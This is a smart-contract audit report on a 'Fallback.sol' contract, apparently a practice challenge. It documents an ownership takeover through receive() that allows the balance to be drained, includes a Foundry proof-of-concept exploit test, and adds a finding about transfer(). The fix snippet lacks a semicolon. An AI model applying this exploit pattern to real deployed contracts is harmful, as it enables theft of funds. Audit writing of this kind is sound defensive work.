# Fallback Audit Report

## Summary
During the security audit for `Fallback.sol` contract a total of 2 issues were identified.

| Severity | Number of Findings |
| -------- | ------------------ |
| Critical | 1                  |
| High     | 0                  |
| Medium   | 1                  |
| Low      | 0                  |
| Info     | 0                  |
| Gas      | 0                  |
Total: 2

## Scope
The following files were in scope for this audit:

```text
Language                     files          blank        comment           code
-------------------------------------------------------------------------------
Solidity                         1              8              1             30
-------------------------------------------------------------------------------
SUM:                             1              8              1             30
```

## Findings
### [C-1] Insecure ownership transition in `Fallback::receive()`allows unathorized draining funds

**Description**
The `receive()` function incorrectly allows any address to claim the `owner`role. An attacker can sastisfy this condition via the `contribute()`function ant then trigger the `receive()` function by sending some ether and gaining the ownership of the contract.

**Impact**
An attacker can gain full administrative privileges, allowing them to call the `withdraw()`function and drain the entire contract balance, resulting in a total loss of protocol funds.

**Proof of Concept:**
The following test case demonstrates anyone can get the ownership of the contract and withdraw all funds just by following the nexts steps:
1. Do a contribution
2. send eth to the contract
3. you will get the ownership
4. withdraw all funds

<details>
<summary>Code</summary>

```javascript
    function testExploit() public {
        vm.startPrank(attacker);

        // Step 1: Send some ether to the contract
        fallbackContract.contribute{value: 0.0005 ether}();

        // Step 2: Send some ether directly to execute the `receive` function
        (bool success, ) = address(fallbackContract).call{value: 1 wei}("");
        require(success, "Transfer failed");

        // Step 3: Check we got the ownership of the contract
        assertEq(fallbackContract.owner(), attacker);

        // Step 4: Execute the withdraw function
        fallbackContract.withdraw();

        // Step 5: Balance token drained successfully
        assertEq(address(fallbackContract).balance, 0);

        vm.stopPrank();
    }
```

</details>

**Recommended Mitigation:**
Remove administrative logic from low-level functions like `receive()` or `fallback()`. Ownership changes should be handled through explicit, well-guarded functions using established access control patterns (e.g., OpenZeppelin’s Ownable).




### [#-1] `Fallback::transfer()` is deprecated and may lead to Denial of Service (DoS)

**Description:**
`transfer()` function is deprecated and scheduled for removal as they only support 2300 gas, and if not it throws an error reverting the transaction. 

**Impact:**
If more gas is needed to support the transaction, it will throw an error of gas limit exceed and revert the transaction.

**Proof of Concept:**
The issue is located at the `withdraw()`function.

<details>
<summary>Code</summary>

```javascript
    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
```

</details>

**Recommended Mitigation:**
The suggested method for sending ether accordingly to the [Solidity documentation](https://docs.soliditylang.org/en/latest/contracts.html#special-functions) is via the `.call{value: msg.value}("")` function and capturing the error if the transaction is not successful.

```javascript
function withdraw() public onlyOwner {
        (bool success ,) = owner.call{value: address(this).balance}("")
        require(success, "Transfer failed");
    }
```